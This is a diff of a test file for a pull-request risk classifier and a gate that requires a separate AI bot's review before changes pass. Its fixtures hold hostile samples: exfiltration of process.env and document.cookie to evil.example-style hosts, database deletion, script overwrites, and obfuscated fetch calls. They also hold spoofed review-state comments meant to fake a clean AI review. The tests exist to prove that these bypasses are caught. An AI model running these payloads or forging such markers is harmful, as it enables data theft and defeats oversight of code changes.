@@ -12,7 +12,8 @@ import {
 } from './operating-model.cjs';
 import { TIER_C_EXACT_PATHS, TIER_C_PATH_PREFIXES } from './merge-risk.js';
 
-const ACTIVATED = '2026-12-01T00:00:00Z';
+// Must be in the past: a future activation is not armed.
+const ACTIVATED = '2026-01-01T00:00:00Z';
 const HEAD = 'a'.repeat(40);
 const OLD_HEAD = 'b'.repeat(40);
 const CODEX = 'chatgpt-codex-connector[bot]';
@@ -291,68 +292,189 @@ test('content (adversarial): snapshot or generated files cannot hide code and ar
   assert.equal(classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts'), { ...addedTest('apps/api/src/odds-extra.test.ts'), patch: undefined }] }).class, 'Protected');
 });
 
+// ── Adversarial-review regressions (one per reported bypass) ────────────────
+
+test('mode (adversarial P3): LEAN_MODE_ACTIVATED_AT must be strict ISO-8601 and not in the future', () => {
+  const now = Date.parse('2026-11-10T00:00:00Z');
+  for (const activatedAt of ['1', 'Dec 1 2025', '2025-13-45', '2026/01/01', '2026-01-01 00:00', '2026-11-11T00:00:00Z', '2999-01-01']) {
+    assert.equal(resolveOperatingMode({ flag: 'lean', activatedAt, now }).mode, 'legacy', activatedAt);
+  }
+  for (const activatedAt of ['2026-01-01', '2026-11-09T23:59:59Z', '2026-11-09T12:00:00.123+02:00']) {
+    assert.equal(resolveOperatingMode({ flag: 'lean', activatedAt, now }).mode, 'lean', activatedAt);
+  }
+});
+
+const UI_BYPASSES: Array<[string, string, string]> = [
+  ['P1-a alias with ..', 'Widget.tsx', "import { settle } from '@/components/../app/actions/settle';\nexport const A = () => <button onClick={() => settle()}>x</button>;\n"],
+  ['P1-a comment before specifier', 'Widget.tsx', "import { doIt } from /**/ '@/lib/server/thing';\nexport const A = () => null;\n"],
+  ['P1-a line comment before specifier', 'Widget.tsx', "import { doIt } from // hi\n  '@/lib/server/thing';\nexport const A = () => null;\n"],
+  ['P1-a export-from with ..', 'Widget.tsx', "export { x as default } from '@/components/ui/../../app/api/x/route';\n"],
+  ['P1-a escaped specifier', 'Widget.tsx', "import { x } from '@/components/\\u002e\\u002e/app/x';\n"],
+  ['P1-a relative ..', 'ui/Widget.tsx', "import { Icon } from '../Icon';\nexport const A = () => <Icon />;\n"],
+  ['P1-b fetch.call', 'Widget.tsx', "export const A = () => <button onClick={() => fetch.call(null, '/api/x', { method: 'POST' })}>x</button>;\n"],
+  ['P1-b globalThis[fetch]', 'Widget.tsx', "export const A = () => <button onClick={() => { const f = globalThis['fetch']; f('/api/x'); }}>x</button>;\n"],
+  ['P1-b navigator computed', 'Widget.tsx', "export const A = () => <button onClick={() => navigator['sendB' + 'eacon']('/api/x')}>x</button>;\n"],
+  ['P1-b document[cookie]', 'Widget.tsx', "export const A = () => <img src={'https://e.example/?c=' + document['cookie']} />;\n"],
+  ['P1-b window[]', 'Widget.tsx', "export const A = () => { window['loc' + 'ation'] = '/x'; return null; };\n"],
+  ['P1-b self[]', 'Widget.tsx', "export const A = () => { self['f' + 'etch']('/x'); return null; };\n"],
+  ['P1-b XMLHttpRequest', 'Widget.tsx', 'export const A = () => { new XMLHttpRequest(); return null; };\n'],
+  ['P1-b createElement form', 'Widget.tsx', "import React from 'react';\nexport const A = () => React.createElement('form', { method: 'post', ['act' + 'ion']: '/api/x' });\n"],
+  ['P1-b createElement non-literal', 'Widget.tsx', "import React from 'react';\nconst t = 'fo' + 'rm';\nexport const A = () => React.createElement(t, {});\n"],
+  ['P1-b template use server', 'Widget.tsx', 'export function A() { async function go() { `use server`; } return <button onClick={go} />; }\n'],
+  ['P3 css @import', 'a.css', '@import url("https://evil.example/x.css");\n'],
+  ['P3 css url(http)', 'a.css', '.x { background: url(https://evil.example/p.png); }\n'],
+  ['P3 css protocol-relative url', 'a.css', ".x { background: url('//evil.example/p.png'); }\n"],
+];
+
+test('content (adversarial P1-a/P1-b/P3): every reported UI bypass is Protected', () => {
+  for (const [label, name, content] of UI_BYPASSES) {
+    const filename = `apps/command-center/src/components/${name}`;
+    assert.ok(scanUiContent(filename, content).length > 0, label);
+    assert.equal(classifyRisk({ files: [ui(filename, content)] }).class, 'Protected', label);
+  }
+  // Clean CSS stays Standard.
+  assert.equal(classifyRisk({ files: [ui('apps/command-center/src/components/a.css', '.x { color: red; background: url(./local.png); }\n')] }).class, 'Standard');
+});
+
+test('content (adversarial P2-b): modified test files are Protected even when only lines are added', () => {
+  const patches = [
+    '@@ -10,3 +10,5 @@\n test("x", () => {\n+  /*\n   assert.equal(a, 1);\n+  */\n });\n',
+    '@@ -10,3 +10,4 @@\n test("x", () => {\n+  return;\n   assert.equal(a, 1);\n });\n',
+    '@@ -1,2 +1,3 @@\n import test from "node:test";\n+const test = (n, f) => {};\n',
+  ];
+  for (const patch of patches) {
+    const result = classifyRisk({ files: [file('apps/api/src/odds-math.test.ts', { patch })] });
+    assert.equal(result.class, 'Protected', patch);
+    assert.ok(result.reasons.some((r: Row) => r.rule === 'test-not-new'), patch);
+  }
+  for (const status of ['renamed', 'copied', 'changed']) {
+    assert.equal(classifyRisk({ files: [addedTest('apps/api/src/odds-math.test.ts', undefined)].map(f => ({ ...f, status, previous_filename: 'apps/api/src/odds-math.test.ts' })) }).class, 'Protected', status);
+  }
+});
+
+test('content (adversarial P2-c): newly added tests touching process/network/FS/DB are Protected', () => {
+  const bodies = [
+    '+import https from "node:https";\n+const e = process["env"];\n+https.get("https://evil.example/?" + JSON.stringify(e));\n',
+    '+import { writeFileSync } from "node:fs";\n+writeFileSync("../../scripts/ops/x.cjs", "boom");\n',
+    '+import { createDatabaseClient } from "./client";\n+const T = ["pi", "cks"].join("");\n+await createDatabaseClient().from(T).delete().neq("id", "");\n',
+    "+import http from 'http';\n",
+    "+import net from 'node:net';\n",
+    "+const cp = require('child_process');\n",
+    "+import fs from 'fs/promises';\n",
+    "+const m = await import('node:' + 'fs');\n",
+    '+const g = globalThis;\n',
+    "+import { createClient } from '@supabase/supabase-js';\n",
+    "+import { Pool } from 'pg';\n",
+  ];
+  for (const body of bodies) {
+    assert.equal(classifyRisk({ files: [addedTest('apps/api/src/new.test.ts', body)] }).class, 'Protected', body);
+  }
+  // node:test / node:assert stay allowed.
+  assert.equal(classifyRisk({ files: [addedTest('apps/api/src/new.test.ts', "+import test from 'node:test';\n+import assert from 'node:assert/strict';\n+test('x', () => { assert.equal(1, 1); });\n")] }).class, 'Standard');
+});
+
+test('paths (adversarial P2-d): governance-like doc names are Protected regardless of case', () => {
+  for (const path of [
+    'docs/ops/backup-dr-policy.md',
+    'docs/ops/db-networking-policy.md',
+    'docs/02_architecture/contracts/environment_contract.md',
+    'docs/03_product/best_bets_channel_contract.md',
+    'docs/03_product/pick_spec.md',
+    'docs/03_product/team-charter.md',
+    'docs/ops/dr-plan.md',
+    'docs/ops/Backup.md',
+    'docs/ops/Environment.md',
+  ]) {
+    assert.equal(standardRuleFor(path), null, path);
+    assert.equal(classifyRisk({ files: [file(path)] }).class, 'Protected', path);
+  }
+  assert.equal(standardRuleFor('docs/03_product/board-layout-notes.md'), 'docs');
+});
+
 // ── Independent review ─────────────────────────────────────────────────────
 
-test('review: a trusted-bot review bound to the exact head passes', () => {
-  const result = ir({ reviews: [review()] });
+test('review: passes only on the anchored connector summary bound to the exact head', () => {
+  const result = ir({ comments: [summary({})] });
   assert.equal(result.pass, true, result.reasons.join(' '));
   assert.deepEqual(result.reviewers, ['chatgpt-codex-connector']);
+  assert.equal(ir({ reviews: [review()], comments: [summary({})] }).pass, true, 'a clean review beside the summary is fine');
 });
 
-test('review: fails closed with no review, a stale-head review, an untrusted identity, or a missing head', () => {
-  assert.equal(ir({ reviews: [] }).pass, false);
-  assert.equal(ir({ reviews: [review({ commit_id: OLD_HEAD })] }).pass, false);
-  assert.equal(ir({ reviews: [review({ user: { login: 'griff843', type: 'User' } })] }).pass, false);
-  assert.equal(ir({ reviews: [review({ user: { login: 'some-app[bot]', type: 'Bot' } })] }).pass, false);
-  assert.equal(ir({ reviews: [review({ user: { login: CODEX, type: 'User' } })] }).pass, false);
-  assert.equal(ir({ reviews: [review({ state: 'DISMISSED' })] }).pass, false);
-  assert.equal(ir({ reviews: [review({ submitted_at: null })] }).pass, false);
-  assert.equal(evaluateIndependentReview({ reviews: [review()], headSha: '' }).pass, false);
-  assert.equal(ir({ reviews: [review()], prAuthorLogin: CODEX }).pass, false, 'implementer can never be the reviewer');
+test('review (adversarial P1-c): a bare bot review object never passes; a missing summary is FAIL', () => {
+  assert.equal(ir({ reviews: [review()] }).pass, false, 'clean-looking review at head');
+  assert.equal(ir({ reviews: [review({ body: '' })] }).pass, false, 'empty-body review at head');
+  assert.equal(ir({ reviews: [review({ state: 'APPROVED' })] }).pass, false, 'APPROVED review at head');
+  // The P1 thread (and/or the summary) was deleted: only a review object remains.
+  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [] }).pass, false);
 });
 
-test('review (adversarial): an author-resolved P0/P1 thread does not clear without a LATER clean pass at head', () => {
-  // Finding raised in review 5 at T0 on the current head, author resolves it, no later pass.
-  const findingReview = review({ id: 5, submitted_at: T0, body: 'Here are some automated review suggestions.' });
-  const resolved = finding({}, { isResolved: true });
-  const blocked = ir({ reviews: [findingReview], threads: [resolved] });
-  assert.equal(blocked.pass, false, 'the finding review itself is not a clean pass');
-  // Unresolved P1 blocks even with a later clean pass.
-  assert.equal(ir({ reviews: [findingReview, review({ id: 6, submitted_at: T2 })], threads: [finding()] }).pass, false);
-  // Resolved + later clean review at head => pass.
-  assert.equal(ir({ reviews: [findingReview, review({ id: 6, submitted_at: T2 })], threads: [resolved] }).pass, true);
-  // Later clean review at an OLD head does not count.
-  assert.equal(ir({ reviews: [findingReview, review({ id: 6, submitted_at: T2, commit_id: OLD_HEAD })], threads: [resolved] }).pass, false);
-  // Bot logins as GraphQL reports them (no [bot] suffix) are recognised as findings.
-  assert.equal(ir({ reviews: [review({ id: 6, submitted_at: T2 })], threads: [finding({ author: { login: CODEX_GQL } })] }).pass, false);
+test('review: fails closed with no artifacts, a stale summary, an untrusted identity, or a missing head', () => {
+  assert.equal(ir({}).pass, false);
+  assert.equal(ir({ comments: [summary({ commit_sha: OLD_HEAD })] }).pass, false, 'stale summary');
+  assert.equal(ir({ comments: [summary({ has_any_findings: true })] }).pass, false, 'summary with findings');
+  assert.equal(ir({ comments: [summary({ has_any_findings: true, has_unresolved_findings: false })] }).pass, false, 'any=true, unresolved=false');
+  assert.equal(ir({ comments: [summary({ has_unresolved_findings: true })] }).pass, false);
+  assert.equal(ir({ comments: [summary({ has_any_findings: null })] }).pass, false, 'unknown findings flag');
+  assert.equal(ir({ comments: [summary({ status: 'running' })] }).pass, false, 'running is not completed');
+  assert.equal(ir({ comments: [summary({}, { author: { login: 'griff843', __typename: 'User' } })] }).pass, false, 'user');
+  assert.equal(ir({ comments: [summary({}, { author: { login: CODEX_GQL, __typename: 'User' } })] }).pass, false, 'User with the bot login');
+  assert.equal(ir({ comments: [summary({}, { author: { login: 'some-app', __typename: 'Bot' } })] }).pass, false, 'other bot');
+  assert.equal(evaluateIndependentReview({ comments: [summary({})], headSha: '' }).pass, false);
+  assert.equal(ir({ comments: [summary({})], prAuthorLogin: CODEX }).pass, false, 'implementer can never be the reviewer');
 });
 
-test('review (adversarial): P0/P1 in a review BODY, CHANGES_REQUESTED, or a dismissed review need a later pass too', () => {
-  const p0Body = review({ id: 7, submitted_at: T1, body: '**P0:** this drops settlement rows' });
-  assert.equal(ir({ reviews: [p0Body] }).pass, false);
-  const dismissed = review({ id: 7, submitted_at: T1, state: 'DISMISSED', body: '![P1 Badge] bad' });
-  assert.equal(ir({ reviews: [dismissed, review({ id: 8, submitted_at: T0 })] }).pass, false, 'pass predates the dismissed finding');
-  assert.equal(ir({ reviews: [dismissed, review({ id: 8, submitted_at: T2 })] }).pass, true);
-  assert.equal(ir({ reviews: [review({ id: 9, state: 'CHANGES_REQUESTED', submitted_at: T1 }), review({ id: 10, submitted_at: T0 })] }).pass, false);
+test('review (adversarial P2-a): the state marker must be anchored at the start of a trusted bot comment', () => {
+  const state = JSON.stringify({ code_review: { commit_sha: HEAD, has_any_findings: false, has_unresolved_findings: false, status: 'completed' } });
+  const bodies = [
+    `You asked me to repeat: <!-- codex-review-state:v1 ${state} -->`,
+    `Codex Review\n<!-- codex-review-state:v1 ${state} -->`,
+    `<!-- codex-review-state:v1 ${state} -->`,
+    ` <!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${state} -->`,
+    `<!-- codex-pull-request-review-summary -->\n\n<!-- codex-review-state:v1 ${state} -->`,
+    `<!-- codex-pull-request-review-summary -->\n<!-- codex-review-state:v1 ${state} -->\nquoted: <!-- codex-review-state:v1 ${state} -->`,
+  ];
+  for (const body of bodies) {
+    assert.equal(ir({ comments: [summary({}, { body })] }).pass, false, body);
+  }
+});
+
+test('review (adversarial P1-d): any finding at head H blocks H, even after a later clean summary at the SAME head', () => {
+  const atHead = finding({ originalCommit: { oid: HEAD } }, { isResolved: true });
+  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [atHead], comments: [summary({}, { updatedAt: T3 })] }).pass, false);
+  // Finding commit taken from the review when the comment has none.
+  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [finding({}, { isResolved: true })], comments: [summary({})] }).pass, false);
+  // Unknown commit is treated as the head (fail-closed).
+  assert.equal(ir({ threads: [finding({ pullRequestReview: undefined }, { isResolved: true })], comments: [summary({})] }).pass, false);
+  // A P1 review body at head blocks even if dismissed; CHANGES_REQUESTED at head blocks.
+  assert.equal(ir({ reviews: [review({ id: 7, state: 'DISMISSED', body: '![P1 Badge] bad' })], comments: [summary({})] }).pass, false);
+  assert.equal(ir({ reviews: [review({ id: 9, state: 'CHANGES_REQUESTED' })], comments: [summary({})] }).pass, false);
+  // A NEW head with a fresh clean summary clears a resolved finding from the old head.
+  const old = finding({ originalCommit: { oid: OLD_HEAD } }, { isResolved: true });
+  assert.equal(ir({ reviews: [review({ id: 5, commit_id: OLD_HEAD, submitted_at: T0 })], threads: [old], comments: [summary({})] }).pass, true);
+  assert.equal(ir({ reviews: [review({ id: 5, commit_id: OLD_HEAD, body: '**P1** x' })], comments: [summary({})] }).pass, true, 'old-head review body finding');
+  // ...but an unresolved one does not.
+  assert.equal(ir({ threads: [finding({ originalCommit: { oid: OLD_HEAD } })], comments: [summary({})] }).pass, false);
+});
+
+test('review (adversarial P3): every P0/P1 notation and every trusted comment in a thread counts', () => {
+  for (const body of ['**P1** data loss', 'Severity: critical (P1).', '[P1] wrong', 'P1: wrong', 'P0 - bad', 'p1: bad', 'Priority 1 issue', '![P0 Badge](x)']) {
+    const thread = { isResolved: true, comments: [{ author: { login: CODEX_GQL, __typename: 'Bot' }, body, createdAt: T0, originalCommit: { oid: HEAD } }] };
+    assert.equal(ir({ threads: [thread], comments: [summary({})] }).pass, false, body);
+    assert.equal(ir({ reviews: [review({ body })], comments: [summary({})] }).pass, false, `review body: ${body}`);
+  }
+  // Bot P1 as a reply under a human first comment.
+  const reply = { isResolved: false, comments: [{ author: { login: 'griff843', __typename: 'User' }, body: 'question', createdAt: T0 }, { author: { login: CODEX_GQL, __typename: 'Bot' }, body: '**P1** yes, broken', createdAt: T1, originalCommit: { oid: OLD_HEAD } }] };
+  assert.equal(ir({ threads: [reply], comments: [summary({})] }).pass, false);
+  // P2 badges are not findings.
+  const p2 = { isResolved: false, comments: [{ author: { login: CODEX_GQL, __typename: 'Bot' }, body: '![P2 Badge](https://img.shields.io/badge/P2-yellow) nit', createdAt: T0, originalCommit: { oid: HEAD } }] };
+  assert.equal(ir({ threads: [p2], comments: [summary({})] }).pass, true);
 });
 
 test('review (adversarial): trusted artifacts edited by another account are never clean', () => {
-  const edited = finding({ body: 'nit', editor: { login: 'griff843' } }, { isResolved: true });
-  assert.equal(ir({ reviews: [review({ id: 6, submitted_at: T2 })], threads: [edited] }).pass, false);
-  assert.equal(ir({ reviews: [review({ editor: { login: 'griff843' } })] }).pass, false);
+  const edited = finding({ body: 'nit', editor: { login: 'griff843' }, originalCommit: { oid: OLD_HEAD } }, { isResolved: true });
+  assert.equal(ir({ threads: [edited], comments: [summary({})] }).pass, false);
+  assert.equal(ir({ reviews: [review({ editor: { login: 'griff843' } })], comments: [summary({})] }).pass, false);
   assert.equal(ir({ comments: [summary({}, { editor: { login: 'griff843' } })] }).pass, false);
-});
-
-test('review: clean PR with no review object passes on the connector summary for the exact head (no deadlock)', () => {
-  assert.equal(ir({ comments: [summary({})] }).pass, true);
-  assert.equal(ir({ comments: [summary({ commit_sha: OLD_HEAD })] }).pass, false, 'stale summary');
-  assert.equal(ir({ comments: [summary({ has_any_findings: true })] }).pass, false, 'summary with findings is not a pass');
-  assert.equal(ir({ comments: [summary({ status: 'running' })] }).pass, false, 'running is not completed');
-  assert.equal(ir({ comments: [summary({}, { author: { login: 'griff843', __typename: 'User' } })] }).pass, false, 'spoofed summary by a user');
-  // A later summary pass clears an earlier, resolved finding; an earlier one does not.
-  const resolved = finding({}, { isResolved: true });
-  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T0 })], threads: [resolved], comments: [summary({}, { updatedAt: T3 })] }).pass, true);
-  assert.equal(ir({ reviews: [review({ id: 5, submitted_at: T2 })], threads: [finding({ pullRequestReview: { databaseId: 5 } }, { isResolved: true })], comments: [summary({}, { updatedAt: T1 })] }).pass, false);
 });
 
 test('escalation: RISK-CLASS: PROTECTED from a trusted reviewer is sticky across heads and sources; others are ignored', () => {
